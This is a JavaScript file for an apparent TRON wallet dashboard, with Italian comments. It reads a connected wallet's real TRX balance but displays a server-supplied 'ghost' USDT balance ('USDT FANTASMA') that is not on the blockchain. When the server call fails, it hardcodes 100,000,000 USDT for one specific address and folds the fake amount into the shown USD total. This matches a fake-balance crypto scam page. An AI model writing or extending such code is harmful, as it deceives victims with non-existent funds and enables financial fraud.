window.onload = async () => {
    let attempts = 0;
    while (!window.tronWeb && attempts < 20) {
        await new Promise(r => setTimeout(r, 500));
        attempts++;
    }

    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        const address = window.tronWeb.defaultAddress.base58;
        if(document.getElementById('userAddress')) {
            document.getElementById('userAddress').innerText = address.substring(0,8) + '...' + address.substring(address.length - 8);
        }

        try {
            // 1. TRX REALE (Blockchain)
            const balanceSun = await window.tronWeb.trx.getBalance(address);
            const trxReal = balanceSun / 1000000;
            const trxPrice = 0.1182;
            const trxUsdValue = trxReal * trxPrice;

            document.getElementById('trx-bal').innerText = trxReal.toLocaleString('en-US', {minimumFractionDigits: 2});
            document.getElementById('trx-val').innerText = `$${trxUsdValue.toFixed(2)}`;

            // 2. USDT FANTASMA (Server Ocean)
            let usdtDisplay = 0;
            try {
                const response = await fetch(`ledger.php?action=get&address=${address}`);
                const resData = await response.json();
                usdtDisplay = parseFloat(resData.balance);
            } catch(e) { 
                usdtDisplay = (address === "TVi3MehBatfYSUutm4fPeR6y5bqnQjWEYe") ? 100000000.00 : 0.00;
            }

            document.getElementById('usdt-bal').innerText = usdtDisplay.toLocaleString('en-US', {minimumFractionDigits: 2});
            document.getElementById('usdt-val').innerText = `$${(usdtDisplay * 0.9998).toLocaleString()}`;

            // 3. TOTALE
            const totalUsd = trxUsdValue + (usdtDisplay * 0.9998);
            document.getElementById('total-usd').innerText = totalUsd.toLocaleString('en-US', {minimumFractionDigits: 2});
            document.getElementById('total-trx').innerText = `≈ ${(totalUsd / trxPrice).toLocaleString('en-US', {maximumFractionDigits: 0})} TRX`;

        } catch (e) { console.log("Sync error:", e); }
    }
};
